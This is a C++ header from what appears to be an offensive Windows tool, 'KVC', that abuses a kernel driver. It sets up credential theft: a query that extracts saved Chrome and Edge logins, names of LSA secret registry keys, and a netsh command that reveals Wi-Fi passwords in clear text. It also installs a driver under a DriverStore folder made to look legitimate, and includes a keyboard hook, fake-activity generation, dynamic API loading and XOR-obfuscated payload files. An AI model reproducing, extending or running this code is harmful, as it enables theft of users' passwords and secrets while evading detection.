#pragma once

#include <Windows.h>
#include <winternl.h>
#include <DbgHelp.h>
#include <Shellapi.h>
#include <Shlobj.h>
#include <accctrl.h>
#include <aclapi.h>
#include <iostream>
#include <string>
#include <optional>
#include <sstream>
#include <array>
#include <chrono>
#include <memory>

// Session management constants
inline constexpr int MAX_SESSIONS = 16;

#ifdef BUILD_DATE
    #define __DATE__ BUILD_DATE
#endif

#ifdef BUILD_TIME  
    #define __TIME__ BUILD_TIME
#endif

#define kvc_DEBUG_ENABLED 0

#ifdef ERROR
#undef ERROR
#endif

#ifndef SHTDN_REASON_MAJOR_SOFTWARE
#define SHTDN_REASON_MAJOR_SOFTWARE 0x00030000
#endif

#ifndef SHTDN_REASON_MINOR_RECONFIGURE  
#define SHTDN_REASON_MINOR_RECONFIGURE 0x00000004
#endif

// Smart module handle management
struct ModuleDeleter {
    void operator()(HMODULE mod) const noexcept {
        if (mod) {
            FreeLibrary(mod);
        }
    }
};

struct SystemModuleDeleter {
    void operator()(HMODULE) const noexcept {
        // System modules obtained via GetModuleHandle don't need to be freed
    }
};

using ModuleHandle = std::unique_ptr<std::remove_pointer_t<HMODULE>, ModuleDeleter>;
using SystemModuleHandle = std::unique_ptr<std::remove_pointer_t<HMODULE>, SystemModuleDeleter>;

// Fixed logging system with proper buffer size and variadic handling
template<typename... Args>
void PrintMessage(const wchar_t* prefix, const wchar_t* format, Args&&... args)
{
    std::wstringstream ss;
    ss << prefix;
    
    if constexpr (sizeof...(args) == 0)
    {
        ss << format;
    }
    else
    {
        wchar_t buffer[1024];
        swprintf_s(buffer, 1024, format, std::forward<Args>(args)...);
        ss << buffer;
    }
    
    ss << L"\r\n";
    std::wcout << ss.str();
}

#if kvc_DEBUG_ENABLED
    #define DEBUG(format, ...) PrintMessage(L"[DEBUG] ", format, ##__VA_ARGS__)
#else
    #define DEBUG(format, ...) do {} while(0)
#endif

#define ERROR(format, ...) PrintMessage(L"[-] ", format, ##__VA_ARGS__)
#define INFO(format, ...) PrintMessage(L"[*] ", format, ##__VA_ARGS__)
#define SUCCESS(format, ...) PrintMessage(L"[+] ", format, ##__VA_ARGS__)

#define LASTERROR(f) \
    do { \
        wchar_t buf[256]; \
        swprintf_s(buf, 256, L"[-] The function '%s' failed with error code 0x%08x.\r\n", L##f, GetLastError()); \
        std::wcout << buf; \
    } while(0)

// Windows protection type definitions
enum class PS_PROTECTED_TYPE : UCHAR
{
    None = 0,
    ProtectedLight = 1,
    Protected = 2
};

enum class PS_PROTECTED_SIGNER : UCHAR
{
    None = 0,
    Authenticode = 1,
    CodeGen = 2,
    Antimalware = 3,
    Lsa = 4,
    Windows = 5,
    WinTcb = 6,
    WinSystem = 7,
    App = 8,
    Max = 9
};

// Service-related constants
namespace ServiceConstants {
    inline constexpr wchar_t SERVICE_NAME[] = L"KernelVulnerabilityControl";
    inline constexpr wchar_t SERVICE_DISPLAY_NAME[] = L"Kernel Vulnerability Capabilities Framework";
    inline constexpr wchar_t SERVICE_PARAM[] = L"--service";
    
    // Keyboard hook settings
    inline constexpr int CTRL_SEQUENCE_LENGTH = 5;
    inline constexpr DWORD CTRL_SEQUENCE_TIMEOUT_MS = 2000;
    inline constexpr DWORD CTRL_DEBOUNCE_MS = 50;
}

// DPAPI constants for password extraction
namespace DPAPIConstants {
    inline constexpr int SQLITE_OK = 0;
    inline constexpr int SQLITE_ROW = 100;
    inline constexpr int SQLITE_DONE = 101;
    inline constexpr int SQLITE_OPEN_READONLY = 0x00000001;
    
    inline std::string GetChromeV10Prefix() { return "v10"; }
    inline std::string GetChromeDPAPIPrefix() { return "DPAPI"; }
    
    inline std::wstring GetSecurityPolicySecrets() { return L"SECURITY\\Policy\\Secrets"; }
    inline std::wstring GetDPAPISystemKey() { return L"DPAPI_SYSTEM"; }
    inline std::wstring GetNLKMKey() { return L"NL$KM"; }
    inline std::wstring GetDefaultPasswordKey() { return L"DefaultPassword"; }
    
    inline std::wstring GetCurrVal() { return L"CurrVal"; }
    inline std::wstring GetOldVal() { return L"OldVal"; }
    
    inline std::wstring GetChromeUserData() { return L"\\Google\\Chrome\\User Data"; }
    inline std::wstring GetEdgeUserData() { return L"\\Microsoft\\Edge\\User Data"; }
    inline std::wstring GetLocalStateFile() { return L"\\Local State"; }
    inline std::wstring GetLoginDataFile() { return L"\\Login Data"; }
    
    inline std::string GetEncryptedKeyField() { return "\"encrypted_key\":"; }
    
    inline std::string GetLocalAppData() { return "LOCALAPPDATA"; }
    
    inline std::wstring GetHTMLExt() { return L".html"; }
    inline std::wstring GetTXTExt() { return L".txt"; }
    inline std::wstring GetDBExt() { return L".db"; }
    
    inline std::wstring GetTempLoginDB() { return L"temp_login_data.db"; }
    inline std::wstring GetTempPattern() { return L"temp_login_data"; }
    
    inline std::string GetNetshShowProfiles() { return "netsh wlan show profiles"; }
    inline std::string GetNetshShowProfileKey() { return "netsh wlan show profile name=\""; }
    inline std::string GetNetshKeyClear() { return "\" key=clear"; }
    
    inline std::string GetWiFiProfileMarker() { return "All User Profile"; }
    inline std::string GetWiFiKeyContent() { return "Key Content"; }
    
    inline std::string GetLoginQuery() { return "SELECT origin_url, username_value, password_value FROM logins"; }
    
    inline std::wstring GetStatusDecrypted() { return L"DECRYPTED"; }
    inline std::wstring GetStatusClearText() { return L"CLEAR_TEXT"; }
    inline std::wstring GetStatusEncrypted() { return L"ENCRYPTED"; }
    inline std::wstring GetStatusFailed() { return L"FAILED"; }
    inline std::wstring GetStatusExtracted() { return L"EXTRACTED"; }
}

// Dynamic API loading globals for driver operations
extern ModuleHandle g_advapi32;
extern SystemModuleHandle g_kernel32;
extern decltype(&CreateServiceW) g_pCreateServiceW;
extern decltype(&OpenServiceW) g_pOpenServiceW;
extern decltype(&StartServiceW) g_pStartServiceW;
extern decltype(&DeleteService) g_pDeleteService;
extern decltype(&CreateFileW) g_pCreateFileW;
extern decltype(&ControlService) g_pControlService;

// Service mode detection
extern bool g_serviceMode;
extern volatile bool g_interrupted;

// Core driver functions
bool InitDynamicAPIs() noexcept;
extern "C" const wchar_t* GetServiceNameRaw();  // ASM function
std::wstring GetServiceName() noexcept;          // C++ wrapper
std::wstring GetDriverFileName() noexcept;
void GenerateFakeActivity() noexcept;
std::wstring GetSystemTempPath() noexcept;

// Service utility functions
bool IsServiceInstalled() noexcept;
bool IsServiceRunning() noexcept;
std::wstring GetCurrentExecutablePath() noexcept;

// Driver path helper with dynamic discovery and fallback mechanism
// Searches for actual avc.inf_amd64_* directory in DriverStore FileRepository
// Creates directory if needed, falls back to system32\drivers on failure
inline std::wstring GetDriverStorePath() noexcept {
    wchar_t windowsDir[MAX_PATH];
    if (GetWindowsDirectoryW(windowsDir, MAX_PATH) == 0) {
        wcscpy_s(windowsDir, L"C:\\Windows");
    }
    
    std::wstring baseResult = windowsDir;
    std::wstring driverStoreBase = baseResult + L"\\System32\\DriverStore\\FileRepository\\";
    
    // Dynamic search for avc.inf_amd64_* pattern in FileRepository
    WIN32_FIND_DATAW findData;
    std::wstring searchPattern = driverStoreBase + L"avc.inf_amd64_*";
    HANDLE hFind = FindFirstFileW(searchPattern.c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        // Found existing directory - use first match
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                FindClose(hFind);
                return driverStoreBase + findData.cFileName;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    
    // No existing directory found - create with TrustedInstaller privileges
    std::wstring targetPath = driverStoreBase + L"avc.inf_amd64_12ca23d60da30d59";
    return targetPath;
}

// Enhanced version that ensures directory exists before returning path
// Returns empty string on critical failure, valid path on success
inline std::wstring GetDriverStorePathSafe() noexcept {
    std::wstring driverPath = GetDriverStorePath();
    
    // Ensure directory exists - critical for driver operations
    DWORD attrs = GetFileAttributesW(driverPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        // Try to create if it doesn't exist
        if (!CreateDirectoryW(driverPath.c_str(), nullptr) && 
            GetLastError() != ERROR_ALREADY_EXISTS) {
            return L""; // Critical failure
        }
    } else if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        return L""; // Path exists but is not a directory
    }
    
    return driverPath;
}

// KVC combined binary processing constants
inline constexpr std::array<BYTE, 7> KVC_XOR_KEY = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };
inline constexpr wchar_t KVC_DATA_FILE[]  = L"kvc.dat";
inline constexpr wchar_t KVC_PASS_FILE[]  = L"kvc_pass.exe";
inline constexpr wchar_t KVC_CRYPT_FILE[] = L"kvc_crypt.dll";